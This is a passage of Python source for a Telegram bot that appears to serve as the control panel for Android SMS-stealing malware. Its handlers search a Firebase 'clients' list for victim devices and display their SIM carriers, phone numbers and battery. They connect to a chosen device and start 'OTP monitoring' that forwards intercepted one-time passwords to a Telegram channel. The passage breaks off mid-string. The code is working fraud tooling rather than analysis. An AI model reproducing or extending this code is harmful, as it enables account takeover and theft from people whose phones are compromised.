@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_otp_channel")
def handle_otp_channel(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    
    channel_input = message.text.strip()
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        safe_send_message(chat_id, "❌ 𝗕𝗢𝗧 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬 𝗢𝗙𝗙 ❌")
        return
    
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    
    user_states.pop(user_id, None)
    
    loading = safe_send_message(chat_id, """
🔄 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗡𝗚 𝗪𝗜𝗧𝗛 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 

𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧.....
""", track=False)
    
    channel_id, channel_title = join_channel(channel_input)
    
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    if channel_id:
        user_otp_channel[user_id] = {
            "otp_channel_id": channel_id,
            "otp_channel_title": channel_title
        }
        save_data()
        
        safe_send_message(chat_id, f"""
💌 𝗢𝗧𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗦𝗘𝗧

📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: {channel_title}

✅ 𝗡𝗼𝘄 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝗮 𝗱𝗲𝘃𝗶𝗰𝗲 𝘃𝗶𝗮 𝗢𝗡𝗟𝗜𝗡𝗘
𝗠𝗲𝘀𝘀𝗮𝗴𝗲𝘀 𝘄𝗶𝗹𝗹 𝗮𝘂𝘁𝗼-𝗳𝗼𝗿𝘄𝗮𝗿𝗱 𝘁𝗼 𝘁𝗵𝗶𝘀 𝗰𝗵𝗮𝗻𝗻𝗲𝗹!
""")
        
        if user_id in user_connected_device:
            client_id = user_connected_device[user_id]["client_id"]
            fb_list = user_firebase.get(user_id, {})
            if fb_list:
                db = list(fb_list.values())[0]["db"]
                start_otp_monitoring_for_user(user_id, client_id, db, chat_id)
    else:
        safe_send_message(chat_id, """
❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗷𝗼𝗶𝗻 𝗰𝗵𝗮𝗻𝗻𝗲𝗹!

𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲:
• 𝗕𝗼𝘁 𝗶𝘀 𝗮𝗱𝗺𝗶𝗻 𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹
• 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗹𝗶𝗻𝗸/𝗜𝗗 𝗶𝘀 𝗰𝗼𝗿𝗿𝗲𝗰𝘁
""")

@bot.message_handler(func=lambda message: message.text == "🔍 𝗦𝗘𝗔𝗥𝗖𝗛 🔍")
def search_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, "❌ Bot OFF!")
        return
    
    if not check_user_joined(user_id):
        safe_send_message(chat_id, "❌ Join first!")
        return
    
    if user_id not in user_firebase:
        safe_send_message(chat_id, "❌ Please connect Firebase first!")
        return
    
    user_states[user_id] = "waiting_for_search"
    safe_send_message(chat_id, """
🔍 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗖𝗟𝗜𝗘𝗡𝗧 𝗜𝗡𝗙𝗢

𝗱𝗲𝘃𝗶𝗰𝗲𝗜𝗱/𝗠𝗼𝗱𝗲𝗹𝗡𝗮𝗺𝗲

𝗧𝗼 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝗱𝗶𝗿𝗲𝗰𝘁𝗹𝘆
""")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_search")
def handle_search(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    
    search_query = message.text.strip()
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        return
    
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    
    user_states.pop(user_id, None)
    
    loading = safe_send_message(chat_id, """
🔍 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗗𝗘𝗩𝗜𝗖𝗘 𝗦𝗧𝗔𝗧𝗨𝗦...

━━━━━━━━━━━━━━━━━━━━
𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗢𝗡 𝗙𝗢𝗨𝗡𝗗 ✅
𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗 - 🔍 𝗦𝗲𝗮𝗿𝗰𝗵𝗶𝗻𝗴...

𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗢𝗻𝗹𝗶𝗻𝗲?
𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁...... ⏳
━━━━━━━━━━━━━━━━━━━━
""", track=False)
    
    found_client = None
    found_fb_id = None
    found_db = None
    
    fb_list = user_firebase.get(user_id, {})
    
    for fb_id, fb_data in fb_list.items():
        try:
            db = fb_data["db"]
            clients = db.child("clients").get()
            
            if clients and clients.each():
                for client in clients.each():
                    client_data = client.val()
                    if client_data and isinstance(client_data, dict):
                        client_id = client.key()
                        model_name = client_data.get("modelName", "")
                        
                        if (search_query.lower() in client_id.lower() or 
                            search_query.lower() in model_name.lower() or
                            search_query == client_id or
                            search_query == model_name):
                            found_client = {"id": client_id, "data": client_data}
                            found_fb_id = fb_id
                            found_db = db
                            break
            if found_client:
                break
        except:
            pass
    
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    if found_client:
        client_id = found_client["id"]
        client_data = found_client["data"]
        
        # Check if device is online
        if not is_client_online(found_db, client_id):
            safe_send_message(chat_id, f"""
⚠️ 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗢𝗡 𝗢𝗙𝗙𝗟𝗜𝗡𝗘 𝗥𝗜𝗚𝗛𝗧 𝗡𝗢𝗪 ⚠️

🆔 𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗: <code>{client_id}</code>

𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿!
""")
            return
        
        # Device is online - show info with Yes/No confirmation
        model_name = client_data.get('modelName', 'Unknown')
        battery = client_data.get('battery', 'N/A')
        sims = client_data.get("sims", [])
        
        sim_details = ""
        for sim in sims:
            sim_details += f"📶 {sim.get('carrierName', 'N/A')}  |  📞 {sim.get('phoneNumber', 'N/A')}  |  🎰 𝗦𝗹𝗼𝘁 {sim.get('simSlotIndex', 'N/A')}\n"
        
        msg = f"""
🔍 𝗗𝗘𝗩𝗜𝗖𝗘 𝗙𝗢𝗨𝗡𝗗 𝗔𝗡𝗗 𝗢𝗡𝗟𝗜𝗡𝗘 ✅

🆔 𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗: <code>{client_id}</code>
🪩 𝗠𝗼𝗱𝗲𝗹: {model_name}
🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆: {battery}%

📱 𝗧𝗼𝘁𝗮𝗹 𝗦𝗶𝗺𝘀: {len(sims)}
{sim_details.rstrip() if sim_details else '⚠️ 𝗡𝗼 𝗦𝗜𝗠 𝗳𝗼𝘂𝗻𝗱'}

━━━━━━━━━━━━━━━━━━━━
<b>𝗗𝗼 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝘁𝗵𝗶𝘀 𝗱𝗲𝘃𝗶𝗰𝗲?</b>
"""
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("✅ 𝗬𝗘𝗦 𝗖𝗢𝗡𝗡𝗘𝗖𝗧 ✅", callback_data=f"searchconnect_{found_fb_id}_{client_id}"),
            types.InlineKeyboardButton("❌ 𝗡𝗢 𝗖𝗔𝗡𝗖𝗘𝗟 ❌", callback_data="searchcancel")
        )
        
        safe_send_message(chat_id, msg, reply_markup=keyboard)
    else:
        safe_send_message(chat_id, """
❌ 𝗖𝗟𝗜𝗘𝗡𝗧 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗!
""")

@bot.callback_query_handler(func=lambda call: call.data == "searchcancel")
def search_cancel_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    safe_send_message(chat_id, "❌ 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱!")
    bot.answer_callback_query(call.id, "Cancelled")

@bot.callback_query_handler(func=lambda call: call.data.startswith("searchconnect_"))
def search_connect_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    parts = call.data.replace("searchconnect_", "").split("_")
    
    if len(parts) == 2:
        fb_id, client_id = parts
    else:
        client_id = parts[0]
        fb_id = "1"
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        bot.answer_callback_query(call.id, "❌ Bot is OFF!", show_alert=True)
        return
    
    fb_list = user_firebase.get(user_id, {})
    if not fb_list:
        bot.answer_callback_query(call.id, "❌ Firebase first!", show_alert=True)
        return
    
    fb_data = fb_list.get(fb_id, list(fb_list.values())[0])
    db = fb_data["db"]
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    if not is_client_online(db, client_id):
        bot.answer_callback_query(call.id, "❌ Device is now OFFLINE!", show_alert=True)
        safe_send_message(chat_id, f"""
⚠️ 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗢𝗡 𝗢𝗙𝗙𝗟𝗜𝗡𝗘 𝗥𝗜𝗚𝗛𝗧 𝗡𝗢𝗪 ⚠️

🆔 𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗: <code>{client_id}</code>
""")
        return
    
    connecting = safe_send_message(chat_id, "🔄 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗡𝗚...", track=False)
    client_data = get_client_by_id(db, client_id)
    if connecting:
        try:
            bot.delete_message(chat_id, connecting.message_id)
        except:
            pass
    
    if not client_data:
        bot.answer_callback_query(call.id, "❌ Device not found!", show_alert=True)
        return
    
    if user_id in user_connected_device:
        old_device = user_connected_device[user_id]
        old_model = old_device.get("data", {}).get("modelName", "Unknown")
        user_connected_device.pop(user_id, None)
        if user_id in user_selected_sim:
            user_selected_sim.pop(user_id, None)
        if user_id in otp_monitoring:
            del otp_monitoring[user_id]
        if user_id in user_locked_messages:
            del user_locked_messages[user_id]
        safe_send_message(chat_id, f"🛑 𝗗𝗶𝘀𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗽𝗿𝗲𝘃𝗶𝗼𝘂𝘀 𝗱𝗲𝘃𝗶𝗰𝗲: {old_model}")
    
    user_connected_device[user_id] = {"client_id": client_id, "data": client_data, "fb_id": fb_id}
    
    sims = client_data.get("sims", [])
    has_sim = len(sims) > 0
    
    sim_details = ""
    sim_buttons = []
    
    for i, sim in enumerate(sims):
        sim_details += f"📶 {sim.get('carrierName', 'N/A')}  |  📞 {sim.get('phoneNumber', 'N/A')}  |  🎰 𝗦𝗹𝗼𝘁 {sim.get('simSlotIndex', 'N/A')}\n"
        sim_buttons.append(types.InlineKeyboardButton(f"𝗦𝗜𝗠 - {i+1}", callback_data=f"selectsim_{fb_id}_{client_id}_{i}"))
    
    if not has_sim:
        user_selected_sim[user_id] = {
            "client_id": client_id,
            "sim_index": None,
            "sim_data": None,
            "no_sim": True
        }
        save_data()
        logger.info(f"No SIM device connected for user {user_id}")
    
    recharge_info_lines = []
    all_available = True
    
    if has_sim:
        for sim in sims:
            sim_number = sim.get('phoneNumber', '')
            if sim_number:
                status = check_recharge_per_sim_smart(db, client_id, sim_number)
                recharge_info_lines.append(f"📞 {sim_number} - {status}")
                if "EXPIRED" in status:
                    all_available = False
    else:
        recharge_info_lines.append("⚠️ 𝗡𝗼 𝗦𝗜𝗠 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝗱𝗲𝘃𝗶𝗰𝗲")
    
    recharge_status = "✅ AVAILABLE" if all_available else "⚠️ EXPIRED"
    recharge_text = "\n".join(recharge_info_lines)
    
    token_status = "✅ ACTIVE" if user_id in user_token_channel else "❌ NOT SET"
    otp_status = "✅ ACTIVE" if user_id in user_otp_channel else "❌ NOT SET"
    
    msg = f"""
═══════════════════════
💞 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗 𝗗𝗘𝗩𝗜𝗖𝗘 💞
═══════════════════════

🆔 𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗: <code>{client_id}</code>

🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆 - {client_data.get('battery', 'N/A')}
🪩 𝗠𝗼𝗱𝗲𝗹 - {client_data.get('modelName', 'Unknown')}

📱 𝗧𝗼𝘁𝗮𝗹 𝗦𝗶𝗺𝘀: {len(sims)}
{sim_details.rstrip() if sim_details else '⚠️ 𝗡𝗼 𝗦𝗜𝗠 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗶𝘀 𝗱𝗲𝘃𝗶𝗰𝗲'}

━━━━━━━━━━━━━━━━━━━━
✅ 𝗥𝗘𝗖𝗛𝗔𝗥𝗚𝗘 𝗦𝗧𝗔𝗧𝗨𝗦: {recharge_status}
{recharge_text}

━━━━━━━━━━━━━━━━━━━━
🔑 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟: {token_status}
📨 𝗢𝗧𝗣 𝗠𝗢𝗡𝗜𝗧𝗢𝗥𝗜𝗡𝗚: {otp_status}
━━━━━━━━━━━━━━━━━━━━
"""
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    if sim_buttons:
        keyboard.add(*sim_buttons)
    
    keyboard.add(types.InlineKeyboardButton("🛟 𝗨𝗣𝗗𝗔𝗧𝗘 𝗕𝗔𝗟 🛟", callback_data=f"updbal_{client_id}"))
    
    safe_send_message(chat_id, msg, reply_markup=keyboard)
    save_data()
    
    if user_id in user_otp_channel:
        start_otp_monitoring_for_user(user_id, client_id, db, chat_id)
    
    if user_id not in user_token_channel:
        user_states[user_id] = "waiting_for_channel"
        safe_send_message(chat_id, """
📢 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟

𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗟𝗜𝗡𝗞 / 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗜𝗗

💡 <b>Tip:</b> Use 𝗧𝗢𝗞𝗘𝗡 𝗖𝗡 to set permanent channel
""")
    
    bot.answer_callback_query(call.id, "✅ Connected Successfully!")

@bot.message_handler(func=lambda message: message.text == "𝗟𝗢𝗚𝗢𝗨𝗧")
def logout_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, "❌ Bot OFF!")
        return
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🎗️ 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘", callback_data="logout_firebase"),
        types.InlineKeyboardButton("𝗢𝗧𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", callback_data="logout_otp"),
        types.InlineKeyboardButton("𝗧𝗢𝗞𝗘𝗡 𝗖𝗡", callback_data="logout_token")
    )
    
    safe_send_message(chat_id, """
═══════════════════════
    ☢️ 𝗪𝗛𝗔𝗧 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧  ☢️    
═══════════════════════

✅ 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘 - Logout Firebase
✅ 𝗢𝗧𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 - Logout OTP
✅ 𝗧𝗢𝗞𝗘𝗡 𝗖𝗡 - Logout Token Channel

𝗖𝗹𝗶𝗰𝗸 𝗡𝗼𝘄 𝗯𝘂𝘁𝘁𝗼𝗻 𝘁𝗼 𝗖𝗼𝗻𝘁𝗶𝗻𝘂𝗲
""", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "logout_firebase")
def logout_firebase_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    firebase_list = user_firebase.get(user_id, {})
    
    if not firebase_list:
        bot.answer_callback_query(call.id, "❌ No Firebase connected!", show_alert=True)
        return
    
    bot.answer_callback_query(call.id, "📋 Showing your Firebase connections")
    
    count = 1
    for fb_id, fb_data in firebase_list.items():
        msg = f"""
𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘 - {count}
𝗨𝗥𝗟 - {fb_data['url']}

𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗱𝗮𝘁𝗲 - {fb_data.get('connected_date', 'N/A')}
𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝘁𝗶𝗺𝗲 - {fb_data.get('connected_time', 'N/A')}

𝗗𝗢 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗟𝗼𝗴𝗼𝘂𝘁 𝗧𝗵𝗶𝘀
"""
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("👍 𝗟𝗢𝗚𝗢𝗨𝗧 👍", callback_data=f"confirm_logout_fb_{fb_id}"))
        safe_send_message(chat_id, msg, reply_markup=keyboard)
        count += 1

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_logout_fb_"))
def confirm_logout_fb(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    fb_id = call.data.replace("confirm_logout_fb_", "")
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if user_id in user_firebase and fb_id in user_firebase[user_id]:
        del user_firebase[user_id][fb_id]
        if user_id in user_firebase_count:
            user_firebase_count[user_id] = len(user_firebase.get(user_id, {}))
        
        if not user_firebase.get(user_id):
            if user_id in user_firebase:
                del user_firebase[user_id]
            user_firebase_count[user_id] = 0
        
        save_data()
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        safe_send_message(chat_id, f"✅ 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘-{fb_id} 𝗟𝗢𝗚𝗢𝗨𝗧 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟!")
    else:
        bot.answer_callback_query(call.id, "❌ Firebase not found!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "logout_otp")
def logout_otp_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if user_id in user_otp_channel:
        del user_otp_channel[user_id]
        if user_id in otp_monitoring:
            del otp_monitoring[user_id]
        if user_id in user_locked_messages:
            del user_locked_messages[user_id]
        save_data()
        bot.answer_callback_query(call.id, "✅ OTP Channel Logged Out!", show_alert=True)
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        safe_send_message(chat_id, "✅ 𝗢𝗧𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗦𝗘 𝗟𝗢𝗚𝗢𝗨𝗧 𝗛𝗢 𝗚𝗬𝗘")
    else:
        bot.answer_callback_query(call.id, "❌ No OTP Channel connected!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "logout_token")
def logout_token_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if user_id in user_token_channel:
        channel_title = user_token_channel[user_id].get("channel_title", "Unknown")
        del user_token_channel[user_id]
        user_token_active[user_id] = False
        save_data()
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        safe_send_message(chat_id, f"""
✅ 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗟𝗢𝗚𝗢𝗨𝗧!

📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: <b>{channel_title}</b>

🔑 𝗧𝗼𝗸𝗲𝗻: <code>TOKEN_CN</code> - 𝗟𝗢𝗚𝗚𝗘𝗗 𝗢𝗨𝗧 ✅
""")
        bot.answer_callback_query(call.id, "✅ Token Channel Logged Out!")
    else:
        bot.answer_callback_query(call.id, "❌ No Token Channel connected!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("updbal_"))
def update_balance_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    client_id = call.data.replace("updbal_", "")
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        bot.answer_callback_query(call.id, "❌ Bot OFF!", show_alert=True)
        return
    
    user_states[user_id] = f"waiting_for_balance_{client_id}"
    bot.answer_callback_query(call.id, "💰 Send balance amount")
    safe_send_message(chat_id, f"💰 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗮𝗺𝗼𝘂𝗻𝘁:\n🆔 Device: <code>{client_id[:12]}...</code>")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, "").startswith("waiting_for_balance"))
def handle_balance_input(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        safe_send_message(chat_id, "❌ 𝗕𝗢𝗧 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬 𝗢𝗙𝗙 ❌")
        return
    
    state = user_states.pop(user_id, None)
    client_id = state.replace("waiting_for_balance_", "") if state else "unknown"
    
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    
    balance_amount = message.text.strip()
    
    if user_id not in user_balance:
        user_balance[user_id] = {}
    user_balance[user_id][client_id] = balance_amount
    save_data()
    
    safe_send_message(chat_id, f"✅ 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 𝗦𝗔𝗩𝗘𝗗\n🆔 Device: <code>{client_id[:12]}...</code>\n🛟 Balance: {balance_amount}")

@bot.message_handler(func=lambda message: message.text == "𝗗𝗜𝗦𝗖𝗢𝗡𝗡𝗘𝗖𝗧")
def disconnect_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, """
❌ 𝗕𝗢𝗧 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬 𝗢𝗙𝗙 ❌

𝗣𝗟𝗘𝗔𝗦𝗘 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥
         ☠️ @s4_tg2 ☠️
""")
        return
    
    device_status = "Not connected ❌"
    sms_channel_status = "Not connected ❌"
    otp_monitor_status = "Not connected ❌"
    
    if user_id in user_connected_device:
        user_connected_device.pop(user_id, None)
        device_status = "Disconnected ✅"
    
    if user_id in user_selected_sim:
        user_selected_sim.pop(user_id, None)
    
    if user_id in user_channel_data:
        user_channel_data.pop(user_id, None)
        sms_channel_status = "Disconnected ✅"
    
    if user_id in otp_monitoring:
        del otp_monitoring[user_id]
        otp_monitor_status = "Stopped ⏸️"
    
    if user_id in user_last_message_keys:
        del user_last_message_keys[user_id]
    
    if user_id in user_locked_messages:
        del user_locked_messages[user_id]
    
    save_data()
    
    firebase_status = "Connected ✅" if user_id in user_firebase else "Not connected ❌"
    otp_channel_status = "Connected ✅" if user_id in user_otp_channel else "Not connected ❌"
    
    safe_send_message(chat_id, f"""
💔 𝗗𝗜𝗦𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗

📊 𝗦𝘁𝗮𝘁𝘂𝘀:
🩸 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲 - {firebase_status}
📱 𝗗𝗲𝘃𝗶𝗰𝗲 - {device_status}
📢 𝗦𝗠𝗦 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 - {sms_channel_status}
💌 𝗢𝗧𝗣 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 - {otp_channel_status}
🔄 𝗢𝗧𝗣 𝗠𝗼𝗻𝗶𝘁𝗼𝗿 - {otp_monitor_status}

🔁 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲 & 𝗢𝗧𝗣 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗵𝗮𝗶𝗻!
📱 𝗡𝗲𝘄 𝗱𝗲𝘃𝗶𝗰𝗲 𝗸𝗲 𝗹𝗶𝘆𝗲 𝗢𝗡𝗟𝗜𝗡𝗘 𝗽𝗿𝗲𝘀𝘀 𝗸𝗮𝗿𝗼
""")

@bot.message_handler(func=lambda message: message.text == "⚙️ 𝗕𝗢𝗧 𝗠𝗢𝗗𝗘")
def bot_mode_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if user_id != ADMIN_ID:
        safe_send_message(chat_id, "❌ 𝗧𝗵𝗶𝘀 𝗶𝘀 𝗮𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗳𝗲𝗮𝘁𝘂𝗿𝗲!")
        return
    
    update_user_activity(user_id)
    
    global bot_mode
    
    if bot_mode:
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("🔴 𝗢𝗙𝗙 𝗕𝗢𝗧 🔴", callback_data="bot_off"))
        
        safe_send_message(chat_id, """
🟢 𝗕𝗢𝗧 𝗜𝗦 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 𝗙𝗢𝗥 𝗨𝗦𝗘𝗥𝗦

𝗜𝗳 𝘆𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝗼𝗳𝗳 𝗯𝗼𝘁 𝗳𝗼𝗿 𝗮𝗹𝗹

𝗖𝗹𝗶𝗰𝗸 𝗡𝗼𝘄 🔽
""", reply_markup=keyboard)
    else:
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("🟢 𝗢𝗡 𝗕𝗢𝗧 🟢", callback_data="bot_on"))
        
        safe_send_message(chat_id, """
🔴 𝗢𝗪𝗡𝗘𝗥 𝗬𝗢𝗨𝗥 𝗕𝗢𝗧 𝗜𝗦 𝗢𝗙𝗙

𝗜𝗳 𝘆𝗼𝘂 𝗻𝗲𝗲𝗱 𝗢𝗡 𝗯𝗼𝘁 𝗳𝗼𝗿 𝘂𝘀𝗲𝗿𝘀 

𝗖𝗹𝗶𝗰𝗸 𝗡𝗼𝘄 🔽
""", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "bot_on")
def bot_on_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Admin only!", show_alert=True)
        return
    
    global bot_mode
    bot_mode = True
    save_data()
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    safe_send_message(chat_id, """
🟢 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗪 𝗢𝗡

𝗨𝘀𝗲𝗿𝘀 𝗰𝗮𝗻 𝘂𝘀𝗲 𝗯𝗼𝘁 𝗻𝗼𝘄 ✅
""")
    bot.answer_callback_query(call.id, "✅ Bot ON!")

@bot.callback_query_handler(func=lambda call: call.data == "bot_off")
def bot_off_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Admin only!", show_alert=True)
        return
    
    global bot_mode
    bot_mode = False
    save_data()
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    safe_send_message(chat_id, """
🔴 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗪 𝗢𝗙𝗙

